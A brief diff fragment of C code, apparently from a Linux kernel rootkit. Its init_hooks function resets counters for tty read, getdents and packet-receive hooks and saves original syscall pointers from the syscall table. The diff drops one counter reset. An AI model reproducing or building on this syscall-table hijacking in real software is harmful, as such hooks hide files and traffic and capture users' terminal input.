@@ -70,7 +70,6 @@ init_hooks(void)
     atomic_set(&tty_read_count, 0);
     atomic_set(&getdents_count, 0);
     atomic_set(&getdents64_count, 0);
-    atomic_set(&packet_rcv_count, 0);
 
     sys_read = (void *)sys_calls[__NR_read];
     sys_getdents = (void *)sys_calls[__NR_getdents];
